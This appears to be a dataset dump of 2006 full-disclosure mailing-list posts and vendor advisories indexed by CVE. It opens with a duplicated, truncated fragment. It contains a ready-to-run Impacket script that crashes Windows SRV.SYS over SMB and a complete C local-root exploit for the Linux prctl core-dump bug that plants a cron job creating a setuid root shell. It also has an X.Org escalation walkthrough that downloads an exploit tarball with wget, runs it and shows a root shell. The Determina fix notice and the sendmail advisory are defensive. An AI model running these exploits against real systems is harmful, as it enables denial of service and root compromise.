> - ""Sure! I have already started!""
>
> I believe this is not exploitable for code execution, and I know
> stating this is pretty much like putting a loaded gun in my mouth. My
> decision tree for that is:
>
> . Either it crashes in wcsnicmp(). In which case it's only a Denial
> of Service.
> . Or it doesn't crash in wcsnicmp().
> . The string begins with ""\MAILSLOT"", and it becomes a
> MailslotTransaction() where it may find another bug, but not
> this.
> . The string doesn't begin with ""\MAILSLOT"", in which case
> ExecuteTransaction() returns with an error message.
>
> Evidently this is a new bug, not related to the processing of
> Mailslots and even not strictly related to Named Pipes [3], but to
> SMB_COM_TRANSACTION SMB messages (0x25) instead.
>
> So, we were in the process of talking to Microsoft when three
> interesting things happened:
>
> . A few customers sent us emails saying that we should get in touch
> with Microsoft because the exploit was too effective DoSsing
> patched and unpatched boxes.
> . An exploit for the very same bug was published, producing exactly
> the very same traffic as our exploit, bit by bit. And also falling
> in our same mistake of believing it was a Crash for MS06-035. [4]
> . ISS published an advisory a few days latter stating that, given
> the public exploit, they have independently discovered this new
> bug. [3]
>
> Microsoft publicly acknowledged the situation [6] after the advisory
> was published. All the information available says that they are
> currently working in a patch for the issue and that they have ""...not
> observed or received any reports of the PoC being used to actively
> attack systems"", what kind of confirms that the availability of Proof of
> Concept code has nothing to do with the bad people doing bad things.
>
> ---[ Concluding ]
>
> . Yes, there is a public exploit for a yet unpatched bug. This time
> it's just a DoS situation unless somebody proves me wrong (which is
> simpler than proving I'm right).
> . No, even when there's a public exploit, an advisory and a note by
> Microsoft acknowledging the bug, your box is not being DoSsed all the
> time.
> . Advisories with almost no technical details are bad: They do not
> provide enough information to let users decide how serious the
> condition is in their specific situation, quite often lead to the
> accidental discovery of new bugs (this is not the first time I've seen
> it). And more important (for me), they make my everyday task of
> writing exploits harder :-)
> . Microsoft is already working on fixing the issue. They are trying to
> target Noveember for a release.
> . In the meanwhile, filtering ports 135-139 and 445 from the outside is
> pretty much your only choice... Unless somebody comes out with a home
> made patch for SRV.SYS. I haven't checked, but I wouldn't be surprised
> if this could be triggered on UDP, as most standard MAILSLOT
> transactions are made over UDP.
> . We tried targeting a Windows Vista beta 2 build 5381, and it didn't
> crash. So Vista MAY be safe.
> . Only a few days ago, after we finally closed a new release of CORE
> IMPACT (v6.0), I could go back and work on the original MS06-035. I
> got again in touch with HD Moore and Pedram (Thanks again guys!), and
> they passed me some clues, but I'm still working on getting
> something working :-(
>
> take care, be safe
> gera
>
> [1] http://www.microsoft.com/technet/security/bulletin/ms06-035.mspx
> [2] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3942
> [3] http://xforce.iss.net/xforce/alerts/id/231
> [4] http://www.milw0rm.com/exploits/2057
> [5] http://blogs.technet.com/msrc/archive/2006/07/28/443837.aspx
> [6] http://www.tippingpoint.com/security/advisories/TSRT-06-02.html
> [7] http://pedram.redhive.com/blog/2006-07-11/
> [8] http://jsgreen.tamu.edu/Not%20my%20job%20award.jpg
> [9] http://www.funnysnaps.com/possum2.jpg
> [10] http://www.corest.com/common/showdoc.php?idx=562&idxseccion=10
> [11] http://oss.corest.com/projects/impacket.html
> [12] http://www.snia.org/tech_activities/CIFS/CIFS-TR-1p00_FINAL.pdf
>
>
>"
29482,Mailslot bug (MS06-035) vs non-Mailslot bug (CVE-2006-3942),,CVE-2006-3942,"Mailslot bug (MS06-035)
vs.
non-Mailslot bug(MS0?-???/CVE-2006-3942)
This is the story of a yet unpatched bug which is not a 0-day.
Time line:
2006-07-12 - MS06-035 Published by Microsoft [1]
2006-07-12 - ""Windows Mailslot (MS06-035) DoS"" module
released to IMPACT customers
2006-07-13 - We realized (too late) that it was a different bug [2]
2006-07-14 - We got in touch with Microsoft
2006-07-19 - Public exploit released by cocoruder [3]
(frankruder_at_hotmail.com)
2006-07-28 - ISS released their advisory [4]
2006-07-28 - Microsoft acknowledged the bug [5]
2006-08-14 - Today - We publish and advisory [10] and this email
---[ Intro ]
Last month's patch Tuesday started with a nice challenge: A remotely
exploitable code execution kernel bug for most Microsoft's OSes (most
supported Windows). As my job is to write exploits, I jumped to that as
soon as I could (which was latter than what I liked because we were
closing a new version of our product). I got something working in a
short time, sent it to QA to test and released before the end of the
day... I was truly amazed... to only find out, a little bit later, that
I had accidentally found a different (yet unpatched today) bug.
In this pseudo-advisory I will describe the Details of this new bug, the
process of how I [also] ""discovered"" it, and why I think it's not
exploitable (only to be proved later by someone else that I'm a moron)
---[ MS06-035... I think ]
For a long time I've been waiting for a remotely exploitable kernel bug
to try to exploit. It was a tough challenge, at least for me, as I've
never before worked on such a beast. I jumped immediatly to
Microsoft's advisory's [1] ""Vulnerability details"" section to find what
I expected: NOTHING. Just a general description, as in most advisories
lately, which can't, in any way, be used to prove or disprove the
existence of the bug, nor to decide how high in the priority list this
patch should be put:
""There is a remote code execution vulnerability in the Server driver
that could allow an attacker who successfully exploited this
vulnerability to take complete control of the affected system."" [1]
Uhm... if the information is not under ""Vulnerability details"", where
may it be? I think I need to take even more English lessons, because I
thought ""details"" meant ""detalles"", oh well... let's read all the
advisory just in case...
After reading Microsoft's advisory I continued with TippingPoint's [5]
and Pedram Amini's blog [7] to happily find a few more details. Let me
summarize what I knew then:
. Mailslot ==> SMB
. Kernel Heap overflow
. Code execution is possible (why would Microsoft over-rate it?)
. SRV.SYS (Server driver)
. Port 445 (from advisory's Workarounds section)
. First class mailslot (whatever it means)
What do I know about Mailslots? the basics, probably a little bit more,
but surely not enough. Let's see if Impacket [11] has something for
Mailslots:
$ cd Impacket-0.9.6.0
$ grep -i mailslot *
$ grep -i mailslot */*
$ grep -i mailslot */*/*
$ grep -i mailslot */*/*/*
grep: */*/*/*: No such file or directory
... mmmm... nothing... now what? After quickly sending Pedram an
email to congratulate him and HD for their finding (and, of course, cry
for some help), I sat down to read CIFS' specification [12] once again.
I searched for the word ""mailslot"" to only find it in one section
describing the format for Mailslot Write transactions. Nice! Lets try
the fuzzing approach, lets create a Mailslot request with a lot of data!
So I opened my Ethereal and my Python interpreter, booted up a VMware
with Windows, went through the automatic ""Win-R, cmd, ipconfig"". Got
VMware's IP address and continued typing:
from impacket import smb
s = smb.SMB('*SMBSERVER','10.0.1.44')
s.login('','')
tid = s.tree_connect_andx(r'\*SMBSERVERIPC$')
s.send_trans(tid,
'x01x00x00x00x00x00', r'MAILSLOTLANMAN', '', 'A'*1000)
BOOM! The vmware crashed!
What? Wait a second...
At this point I thought ""How stupid I am! I should have
tested this before! just sending a big packet crashed it!"" And I'm one
of those who 5 years ago thought ""first generation fuzzers are not going
to find too many bugs any more""... stupid me!
""Ok. Got a crash, it's a kernel bug... no, no, it's a remotely
exploitable kernel heap overflow bug... it's quite unlikely I will be
able to do anything better than a simple Denial of Service for quite
some days. So I better focus on writing down the documentation. I will
send right away a working version to QA so we can try to ship it today"".
Thought and done. Documentation written, typos fixed, some extra packets
added just in case, QA approved it for ""Early release"" mode...
""Nice! we tested it against most Windows VMWares we have, it crashed
them all in the first try. And we shipped it all in a single day! I was
not really expecting this, I'm more used to spending a few days per bug
until I have a QA-approved shippable version""
- ""Hey Kelya! lets ship it! it's done, QA approved it!""
(Kelya's my boss)
- ""Sure... Ok, it's shipped now. Have you tried against a patched
box?""
- ""Nop... 'cmon, It's not my job to test MS' patches!"" [8] [9]
(thanks aazubel!)
- ""Oh well... let me see... My box is patched, throw it against it""
- ""Ok, going... (double-click), gone""
- ""Eh! wait a second... Got a crash and dump, let me see if the
box's really patched""
- ""Yeah, it must be still unpatched, I'll try someone else's box""
- ...
- ""I think we may have found something else... pass me the memory
dump to debug it""
And so the second part of the story begins.
---[ MS0?-??? - CVE-2006-3942 - the new bug ]
- ""Let's go home now. Tomorrow we'll verify it and talk to Ivan so
he gets in touch with Microsoft about this new issue""
- ""Ok, I'll try to debug it and figure out what's going on""
The new bug, as explained by ISS' advisory [3], is due to a NULL
pointer dereference, and I firmly believe that it's not exploitable. As
I said, I will quite likely be proved wrong on this, but I'll try to
give my reasons:
The crash is actually inside __imp___wcsnicmp, when the string
""\MAILSLOT"" is compared to a NULL pointer. The following code, from
ExecuteTransaction(), is where wcsnicmp() is called from.
SRV.SYS:0002f487: push 9
SRV.SYS:0002f489: push ""\MAILSLOT""
SRV.SYS:0002f48f: push dword ptr [eax+24h] <-- [eax+24] is NULL
SRV.SYS:0002f492: call ds:__imp___wcsnicmp <-- Crash Inside (tm)
SRV.SYS:0002f498: add esp, 0ch
SRV.SYS:0002f49b: test eax, eax
SRV.SYS:0002f49d: jnz loc_2f4aa
SRV.SYS:0002f49f: push esi
SRV.SYS:0002f4a0: call _MailslotTransaction@4 <-- not reached
SRV.SYS:0002f4a5: jmp loc_20bf6
SRV.SYS:0002f4aa:
Apparently, for some reason, our packet made [eax+24h] be NULL,
which forced something like:
wcsnicmp(0, ""\MAILSLOT"", 9);
Which obviously crashes.
After some tests, I found out that the only thing that mattered
here, is that no NUL should be sent after the ""Mailslot name"". And in
fact, 'A'*1000 is not necessary, and the mailslot name doesn't really
have to mean anythin. So, the following python script should still
trigger the bug:
-----
from impacket import smb
s = smb.SMB('*SMBSERVER','10.0.1.44')
s.login('','')
tid = s.tree_connect_andx(r'\*SMBSERVERIPC$')
s.send_trans(tid, 'x01x00x00x00x00x00', 'cuchicuchi','','')
-----
- ""Kelya, Ivan: I'm pretty sure this is a different thing... it's
not related to mailslots, it's not related to a buffer overflow,
and apparently, it's not exploitable for code execution""
- ""Uhm... Ok, I'm getting in touch with MS to let them know. You
should have tried it against a patched box before releasing.""
- ""I know, but we were in Early Release mode, and we were too
worried testing the exploit to stop and test if Microsoft's patch
really worked.""
- ""Take some time to see if it's exploitable or not, I'll talk to
Microsoft""
- ""Sure! I have already started!""
I believe this is not exploitable for code execution, and I know
stating this is pretty much like putting a loaded gun in my mouth. My
decision tree for that is:
. Either it crashes in wcsnicmp(). In which case it's only a Denial
of Service.
. Or it doesn't crash in wcsnicmp().
. The string begins with ""\MAILSLOT"", and it becomes a
MailslotTransaction() where it may find another bug, but not
this.
. The string doesn't begin with ""\MAILSLOT"", in which case
ExecuteTransaction() returns with an error message.
Evidently this is a new bug, not related to the processing of
Mailslots and even not strictly related to Named Pipes [3], but to
SMB_COM_TRANSACTION SMB messages (0x25) instead.
So, we were in the process of talking to Microsoft when three
interesting things happened:
. A few customers sent us emails saying that we should get in touch
with Microsoft because the exploit was too effective DoSsing
patched and unpatched boxes.
. An exploit for the very same bug was published, producing exactly
the very same traffic as our exploit, bit by bit. And also falling
in our same mistake of believing it was a Crash for MS06-035. [4]
. ISS published an advisory a few days latter stating that, given
the public exploit, they have independently discovered this new
bug. [3]
Microsoft publicly acknowledged the situation [6] after the advisory
was published. All the information available says that they are
currently working in a patch for the issue and that they have ""...not
observed or received any reports of the PoC being used to actively
attack systems"", what kind of confirms that the availability of Proof of
Concept code has nothing to do with the bad people doing bad things.
---[ Concluding ]
. Yes, there is a public exploit for a yet unpatched bug. This time
it's just a DoS situation unless somebody proves me wrong (which is
simpler than proving I'm right).
. No, even when there's a public exploit, an advisory and a note by
Microsoft acknowledging the bug, your box is not being DoSsed all the
time.
. Advisories with almost no technical details are bad: They do not
provide enough information to let users decide how serious the
condition is in their specific situation, quite often lead to the
accidental discovery of new bugs (this is not the first time I've seen
it). And more important (for me), they make my everyday task of
writing exploits harder :-)
. Microsoft is already working on fixing the issue. They are trying to
target Noveember for a release.
. In the meanwhile, filtering ports 135-139 and 445 from the outside is
pretty much your only choice... Unless somebody comes out with a home
made patch for SRV.SYS. I haven't checked, but I wouldn't be surprised
if this could be triggered on UDP, as most standard MAILSLOT
transactions are made over UDP.
. We tried targeting a Windows Vista beta 2 build 5381, and it didn't
crash. So Vista MAY be safe.
. Only a few days ago, after we finally closed a new release of CORE
IMPACT (v6.0), I could go back and work on the original MS06-035. I
got again in touch with HD Moore and Pedram (Thanks again guys!), and
they passed me some clues, but I'm still working on getting
something working :-(
take care, be safe
gera
[1] http://www.microsoft.com/technet/security/bulletin/ms06-035.mspx
[2] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3942
[3] http://xforce.iss.net/xforce/alerts/id/231
[4] http://www.milw0rm.com/exploits/2057
[5] http://blogs.technet.com/msrc/archive/2006/07/28/443837.aspx
[6] http://www.tippingpoint.com/security/advisories/TSRT-06-02.html
[7] http://pedram.redhive.com/blog/2006-07-11/
[8] http://jsgreen.tamu.edu/Not%20my%20job%20award.jpg
[9] http://www.funnysnaps.com/possum2.jpg
[10] http://www.corest.com/common/showdoc.php?idx=562&idxseccion=10
[11] http://oss.corest.com/projects/impacket.html
[12] http://www.snia.org/tech_activities/CIFS/CIFS-TR-1p00_FINAL.pdf"
30083,Re: [Full-disclosure] Re: Linux Kernel 2.6.x PRCTL Core Dump Handling - Local r00t Exploit ( BID 18874 / CVE-2006-2451 ),,CVE-2006-2451,"On Thu, Jul 13, 2006 at 01:23:10AM +0300, Ariel Biener wrote:
> On Wednesday 12 July 2006 03:15, Roman Medina-Heigl Hernandez wrote:
>
> Ignore my previous post, it does create a setuid bash version in /tmp/sh, the
> reason it doesn't work is due to SELinux contexts.
This is an important note, IMO. While the original advisory states
that only kernels >= 2.6.13 and <= 2.6.17.4 are vulnerable, it looks
like, somehow, the same vulnerable code is present in patched Redhat
kernels. The previous poster had a 2.6.9 version, and I've just
verified that 2.6.9-11.ELsmp (provided with RH EL 4 update 1) is also
vulnerable.
If this is the case of backporting, this should come as no surprise. If
it is not a backport issue, what vulnerability is being exploited on
these supposedly older kernels?
-jon"
30105,Linux Kernel 2.6.x PRCTL Core Dump Handling - Local r00t Exploit ( BID 18874 / CVE-2006-2451 ),,CVE-2006-2451,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Maybe this is obvious for Paul Starzetz (as well as many other people) but
full-disclosure is not really ""full"" without exploit code.
Working exploit attached. You can also download it from:
http://www.rs-labs.com/exploitsntools/rs_prctl_kernel.c
Greetz to !dSR ppl :-)
- --
Saludos,
- -Roman
PGP Fingerprint:
09BB EFCD 21ED 4E79 25FB 29E1 E47F 8A7D EAD5 6742
[Key ID: 0xEAD56742. Available at KeyServ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2.2 (MingW32)
iD8DBQFEtD815H+KferVZ0IRAjhKAKCtHnTCwV0D/kH3dt0HItQUPZ/JegCglaQM
vO8VFJyxf+EXy2buqTK4kVM=
=dzRm
-----END PGP SIGNATURE-----

/*****************************************************/
/* Local r00t Exploit for: */
/* Linux Kernel PRCTL Core Dump Handling */
/* ( BID 18874 / CVE-2006-2451 ) */
/* Kernel 2.6.x (>= 2.6.13 && < 2.6.17.4) */
/* By: */
/* - dreyer <luna aditel org> (main PoC code) */
/* - RoMaNSoFt <roman rs-labs com> (local root code) */
/* [ 10.Jul.2006 ] */
/*****************************************************/
#include <stdio.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <linux/prctl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>
char *payload="" SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin * * * * * root cp /bin/sh /tmp/sh ; chown root /tmp/sh ; chmod 4755 /tmp/sh ; rm -f /etc/cron.d/core "";
int main() {
int child;
struct rlimit corelimit;
printf(""Linux Kernel 2.6.x PRCTL Core Dump Handling - Local r00t "");
printf(""By: dreyer & RoMaNSoFt "");
printf(""[ 10.Jul.2006 ] "");
corelimit.rlim_cur = RLIM_INFINITY;
corelimit.rlim_max = RLIM_INFINITY;
setrlimit(RLIMIT_CORE, &corelimit);
printf(""[*] Creating Cron entry "");
if ( !( child = fork() )) {
chdir(""/etc/cron.d"");
prctl(PR_SET_DUMPABLE, 2);
sleep(200);
exit(1);
}
kill(child, SIGSEGV);
printf(""[*] Sleeping for aprox. one minute (** please wait **) "");
sleep(62);
printf(""[*] Running shell (remember to remove /tmp/sh when finished) ... "");
system(""/tmp/sh -i"");
}"
32058,"Determina Fix for CVE-2006-1359 (Zero Day MS Internet Explorer Remote ""CreateTextRange()"" Code Execution)",,CVE-2006-1359,"March 27, 2006
Determina Fix for CVE-2006-1359
(Zero Day MS Internet Explorer Remote ""CreateTextRange()"" Code Execution)
Overview & Instructions On Downloading The Free Determina Shield For
CVE-2006-1359
Based on the same technology used in the VPS LiveShield product, Determina
has engineered
a standalone fix that provides free and immediate protection to users
worldwide that need
to protect systems from related attacks until such time as Microsoft issues
its own patch.
Note that current Determina VPS customers do not have to apply this patch as
they have been
protected against this attack without the need for any update.
The source code of the Shield is included in the download for review by any
independent security expert.
This free, standalone fix from Determina can be downloaded from the
following link:
DETCVE-2006-1359.msi
(www.determina.com/security_center/download/DETCVE-2006-1359.msi)
MD5: 85b8bfc1c30c6b4451a3ab803f49708b
SHA1: 308ae9a79e48adecf769fd50ac29ddc37a07d33c
Threat Severity
Critical;
There is currently no known vendor patch released for this vulnerability.
Determina is aware
of multiple exploits circulating on the Internet that can compromise
vulnerable systems.
This fix can be applied to:
Microsoft Internet Explorer 5.01
Microsoft Internet Explorer 6.0
Overview
This is a runtime fix for the IE createTextRange() vulnerability. It can be
applied to Windows
2000, XP and 2003 systems running Internet Explorer 5.01 and 6.0. The
vulnerability lies in the
MSHTML.DLL rendering engine which is loaded into many applications for HTML
rendering, including
but not limited to Internet Explorer and Microsoft Office.
The installation of the fix consists of adding the fix DLL to the
AppInit_DLLs registry key in
HKLMSOFTWAREMicrosoftWindows NTCurrentVersionWindows
The MSI installer will do this automatically. This will enable loading this
fix DLL into all the
vulnerable applications. The fix does not modify any file or application on
the disk. It will only
modify the vulnerable applications and DLLs in memory. The fix will not be
applied to any processes
that are running at the time of the installation. To enable the patch, you
have to restart IE, Outlook
and any other process that need to be protected. After the installation, run
status.exe to verify that
your system is protected. If you have a version of MSHTML.DLL that the patch
does not support,
status.exe will report that the protection is not active.
Once Microsoft releases an official patch and it is installed by the user,
the Determina Shield will
not be applied any more. Determina recommends uninstalling this fix even
though keeping it active will
not affect the system. To uninstall the fix, use ""Add Remove Programs"" in
the Control Panel. To uninstall
it manually, remove the DLL from the AppInit_DLLs key and restart your
machine. You can then safely delete
the DLL.
This tool requires administrative privileges on the vulnerable machines in
order to install the fix.
References
http://www.determina.com/security_center/default.asp
http://secunia.com/advisories/18680/
http://www.frsirt.com/english/advisories/2006/1050
http://www.microsoft.com/technet/security/advisory/917077.mspx
CVE-2006-1359
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2006-1359
About Determina
DeterminaT represents the next generation of intrusion prevention software
that goes beyond mere
detection and current ""best-effort"" prevention to fully eliminate the threat
of the most critical
software attacks. Based on years of research at M.I.T., Determina utilizes
unique patent-pending
Memory FirewallT technology which blocks attacks at the most fundamental
level, by dynamically
building a protective shield around programs while they run in computer
memory. This groundbreaking
approach has proven to be 100% effective against all memory-based attacks -
such as Code Red, Blaster,
Slammer and Sasser - without false positives or ongoing overhead
Disclaimer
The information within this paper may change without notice. Use of this
information constitutes
acceptance for use in an AS IS condition. There are NO warranties, implied
or otherwise, with regard
to this information or its use. Any use of this information is at the user's
risk. In no event shall
the author/distributor (Determina) be held liable for any damages whatsoever
arising out of or in
connection with the use or spread of this information."
32116,"Re: [CVE-2006-0745] X.Org Security Advisory: privilege escalation and DoS in X11R6.9, X11R7.0",,CVE-2006-0745,"Two second exploit, but if anyone is lazy:
$ wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz
$ tar -zpxvf xmodulepath.tgz
$ cd xmodulepath
$ ./root.sh
/bin/rm -f exploit.o exploit.so shell *.o *.so
gcc -fPIC -c exploit.c
gcc -shared -nostdlib exploit.o -o exploit.so
gcc -o shell shell.c
X Window System Version 7.0.0
Release Date: 21 December 2005
X Protocol Version 11, Revision 0, Release 7.0
[ snip ]
r00t # id
uid=0(root) gid=100(users) groups=10(wheel),18(audio)...
On Monday 20 March 2006 08:00, Daniel Stone wrote:
> X.Org Security Advisory, March 20th 2006
> Local privilege escalation in X.Org server 1.0.0 and later; X11R6.9.0
> and X11R7.0
> CVE-ID: CVE-2006-0745"
32119,Re: sendmail vuln advisories (CVE-2006-0058),,CVE-2006-0058,"On Wed, 22 Mar 2006, Marc Bejarano wrote:
> a security vulnerability [...] certain versions [...] under some
> specific timing conditions [...] a specifically crafted attack [...]
> when specific conditions [...] within certain operating system
> architectures [...] certain timing conditions [...] theoretical
> vulnerability [...] specific email payload [...] specific network
> programming skills [...] very specific conditions.
As with many advisories released these days, this announcement contains
almost no vulnerability information other than repetitive, vague mentions
of a ""very specific"" threat, and a notification that a nondescript patch
is available.
So be it - although I do not subscribe to responsible (limited and overly
delayed) disclosure policies (because they greatly benefit the vendor -
the party at fault - and limit the acceptable behavior of the researcher;
and because they effectively stop independent research into, validation
of, and fixing of, existing flaws)... but OK, this approach is favored by
all the powers to be, no point in starting a flame war.
But isn't it hilarious that this particular advisory is not from a closed
source vendor; but rather, for an open source product - and diffs are
available on the net?
So what's the point of maintaining this writing style, other than making
folks who have legitimate uses for a more detailed information feel
miserable?
/mz"
32141,sendmail vuln advisories (CVE-2006-0058),,CVE-2006-0058,"the official advisory from http://www.sendmail.com/company/advisory/
===
Sendmail MTA Security Vulnerability
March 22, 2006
I. Overview
Sendmail, Inc. has recently become aware of a security vulnerability in certain versions of sendmail Mail Transfer Agent (MTA) and UNIX and Linux products that contain it. Sendmail was notified by security researchers at ISS that, under some specific timing conditions, this vulnerability may permit a specifically crafted attack to take over the sendmail MTA process, allowing remote attackers to execute commands and run arbitrary programs on the system running the MTA, affecting email delivery, or tampering with other programs and data on this system. This vulnerability is being tracked as CVE-2006-0058 and can be found at http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0058.
Sendmail is not aware of any public exploit code for this vulnerability. This connection-oriented vulnerability does not occur in the normal course of sending and receiving email. It is only triggered when specific conditions are created through SMTP connection layer commands.
Sendmail has confirmed the technical issue exposing this vulnerability and is providing patches that resolve it in our open source and commercial products. Sendmail has also alerted CERT® Coordination Center (CERT/CC), who has notified US-CERT.
In close coordination with CERT/CC and Internet Security Systems (ISS), Sendmail has taken the following actions:
1. Implemented and certified software patches for open source sendmail MTA versions 8.12 and 8.13
2. Implemented and certified software patches/upgrades for impacted commercial Sendmail products
3. Worked with ISS to validate the developed patches and assure their effectiveness
4. Collaborated with CERT/CC to notify and provide other vendors who use the sendmail MTA with the required source code patches
II. Impact
Within certain operating system architectures, a remote attacker may be able to force certain timing conditions that would allow execution of arbitrary code or commands on a vulnerable system. Systems running an MTA are typically deployed in the DMZ as a gateway for delivering inbound and outbound email, though they may also be used for internal email delivery between systems or applications. In the case of a compromised system, an attack could lead to exposure, deletion, or modification of programs and data on the affected system, interference with or interception of email delivery, and potentially unauthorized access to other systems in the network. Systems running any of the following software are considered vulnerable:
Open Source
1. Sendmail 8.13.5 and earlier versions
Sendmail Commercial Products
1. Sendmail Switch, Managed MTA, and Multi-Switch v 3.1.7 and earlier for Solaris, Linux, AIX, and HP-UX
2. Sendmail Sentrion 1.1 Appliance
3. Sendmail Advanced Message Server and Message Store v 2.2 and earlier for Solaris, Linux, AIX, and HP-UX
4. Intelligent Quarantine 3.0 for Solaris and Linux
3rd Party Products Containing the MTA
Sendmail working with CERT/CC has notified affected vendors and provided them with source code patches to sendmail MTA 8.12 and 8.13 for use in their affected products. CERT/CC will publish specific vendor information on the availability of customer patches.
III. Mitigation and Solution
Mitigation - Enable the RunAsUser option
The impact of this vulnerability can be reduced by setting the RunAsUser option in the configuration file. Details are available in Sendmail’s Knowledgebase article S10621 at https://www.sendmail.com/cfusion/CFIDE/kb_doc.cfm?kb_id=S10621 or in this PDF document http://www.sendmail.com/company/advisory/runasuser.pdf. It is a good security practice to limit the privileges of applications and services whenever possible. Setting the RunAsUser option will limit privileges available to a remote attacker to those of a non-root user.
Solution – Upgrade or Apply a Patch
On March 22, 2006, Sendmail has released to all customers patches/upgrades to the current version of the affected products. Customers with versions of the product that are not supported will be provided with an upgrade to the most current version of the software and the related patch. Sendmail is also notifying customers without support of a special opportunity to renew their support agreement.
The following table summarizes recommended actions by product version and platform.
<see original advisory for table>
Customers with current support agreements can review Knowledgebase entries posted for all of the above products at http://www.sendmail.com/customerlogin/. With any additional questions, please contact Sendmail Technical Support by logging a case online. Customers without login to Knowledgebase can review this information at http://www.sendmail.com/support/.
Customers without current support agreements are advised of the following special support opportunities:
1. For customers who re-instate lapsed support agreements by April 28th, 2006 by purchasing current product version and one year support, Sendmail will waive the re-instatement fee normally charged for lapsed time.
Customers re-instating their support are entitled to future product upgrades, including Switch/Multiswitch 3.2 (planned for availability in April 2006) with the following enhancements:
1. Integration of sendmail MTA 8.13 with support for a number of new threat protection and management features
2. Flow Control reporting and monitoring integrated in Switch UI for individual systems or the entire cluster
3. Asynchronous deployment and monitoring across all cluster members, enabling these activities to run in parallel
4. DKIM signing of outgoing email and DK/DKIM validation of incoming email, enabling classification of validly signed, forged, or unsigned messages to reduce the risk of phishing and spoofing
5. Customers may request a limited technical support option for assistance with upgrading to Switch 3.1 product version. This email-only support option is available free of charge until April 28th, 2006 and for a one time charge of $949.00 thereafter.
To take advantage of these limited time support opportunities, please contact Sendmail by phone (see numbers below) or by email to customerservice sendmail com to request one of these options.
Phone contact information:
<see original advisory for table>
* If this is your first time accessing Sendmail's support system since February 6th, 2006, you will need to set up a new password. Please follow these steps:
1. Visit https://www.sendmail.com/cfusion/CFIDE/nupw.cfm
2. Enter your email address and select the ""Submit"" button.
3. An email message containing a temporary password will be sent to your email address. Follow the instructions in that message to create a permanent password.
IV. FAQ
How was this issue discovered?
Sendmail was recently notified by security researchers at ISS that they discovered certain timing conditions that may permit a specifically crafted attack to take over the sendmail MTA process.
How difficult would it be for someone to exploit this theoretical vulnerability?
This requires creating very specific timing conditions using SMTP connection layer commands and delivering specific email payload. Someone with specific network programming skills would be required to create a successful exploit.
Has anyone been impacted by this?
No, this is a theoretical vulnerability that does not occur during the normal course of sending and receiving email. Sendmail is not aware of any public exploits for this issue on the Internet.
What should a user look for to know if they have been impacted?
There are no known exploits with specific trails that a user could look for at this time.
What could happen if someone does exploit this?
In theory, the attacker may gain the privileges of the sendmail process running on a system and run arbitrary commands and code, subject to those privileges. This could allow someone to interfere with email delivery, tamper with other programs and data on the systems, or try to gain access to other systems on the same network.
Are sendmail MTAs behind my firewall vulnerable?
Most vulnerable MTAs are the ones that are directly accessible to the outside world. These are gateway MTAs that are directly connected to the Internet or are behind a firewall that allows port 25 traffic to pass through. These servers should be patched first. An MTA deployed on an internal network is not vulnerable to an outside attack, but could be affected by an attack launched from the internal network.
Is this a recently introduced problem, or has it been present for some time?
This problem has been present for some time, and it has only recently been discovered through some very specific conditions created in the lab.
Has Sendmail had similar security issues in the past?
Previous to this issue Sendmail had a few issues raised in 2003, which where quickly addressed. Although this type of occurrence is not uncommon in the industry, Sendmail has established procedures to quickly and pro-actively respond to security issues. ISS has complimented Sendmail for our quick and comprehensive response, welcoming our efforts to not only resolve the reported issue, but to deploy additional resources to review and update any related code.
What are you doing to notify affected users?
Sendmail has worked with CERT/CC to manage the communications process for affected vendors, whose products may be based on the sendmail MTA software. We are also notifying the open source community and our commercial customers about this issue and immediate availability of patches and upgrades to correct it.
What should users do until they can install the patches?
Users of sendmail MTA should ensure that they use the RunAsUser configuration option in their environment to reduce the scope of privileges available to the sendmail process. While this doesn’t close the vulnerability, it reduces the impact of any potential exploitation.
What should the users do to request the patches?
Sendmail is notifying our commercial customers about the patches for specific product releases and platforms and providing the information on how to download and obtain these patches or upgrades.
Open source users can get patches from ftp://ftp.sendmail.org/pub/sendmail/ and should also subscribe to sendmail-announce mailing list for any other updates by sending mail to sendmail-announce-request lists sendmail org.
What about 3rd party vendors using the sendmail MTA?
Sendmail has worked with CERT/CC to notify the vendors and provide source code patches. Please monitor CERT/CC vulnerabilities page at http://www.cert.org/nav/index_red.html for updates on patch availability from other vendors.
What versions of the Open Source sendmail MTA are affected?
Versions of the MTA prior to 8.13.5 are affected by this issue. Open source patches are available for 8.12 and 8.13 versions as 8.12.11.20060308 and 8.13.6. The Sendmail Consortium strongly suggests that users upgrade to 8.13.6. Please refer to http://www.sendmail.org/8.13.6.html for more details.
How important is this issue, how quickly should I plan to upgrade?
Sendmail’s threat assessment of this issue is Risk: Medium; Impact: High. Sendmail recommends that customers plan to upgrade their externally accessible MTAs as part of their regularly scheduled maintenance, followed by upgrade to any internal MTAs at a convenient time.
Is this issue related to the recent OpenSSL security advisory?
No, this vulnerability is not related to OpenSSL advisory CAN-2005-2969 (Potential SSL 2.0 Rollback). However, the Switch 3.1.8 cumulative patch also provides an upgrade to OpenSSL that addresses the issue documented in that advisory.
What are all the new changes included in the 3.1.8 patch?
This patch is cumulative to Switch 3.1.7 patch, and includes the following:
1. Changes to the sendmail MTA binary to resolve this vulnerability
2. A few additional MTA fixes to resolve customer issues
3. Upgrade of 3rd party packages, including:
1. OpenSSL is upgraded to version 0.9.6m and includes a fix for CAN-2005-2969 (Potential SSL 2.0 Rollback).
2. Apache is upgraded to version 1.3.34.
3. Mod SSL upgraded to 2.8.25-1.3.34.
How can I verify this is a legitimate security advisory?
Customers can contact Sendmail Technical Support as listed on http://www.sendmail.com/support/contact/ to verify the authenticity of this advisory. The email notification sent to Sendmail customers is signed with PGP, using Sendmail, Inc. Security Officer PGP key, available at: http://www.sendmail.com/security/security-officer.asc. In addition, a PGP signed copy is available for download at: http://www.sendmail.com/company/advisory/index.shtml, signed with the same key.
===
the advisory from the discoverers from http://xforce.iss.net/xforce/alerts/id/216
===
Internet Security Systems Protection Advisory
March 22, 2006
Sendmail Remote Signal Handling Vulnerability
Summary:
ISS has shipped protection for a flaw X-Force has discovered in
the Sendmail server software. By sending malicious data at certain
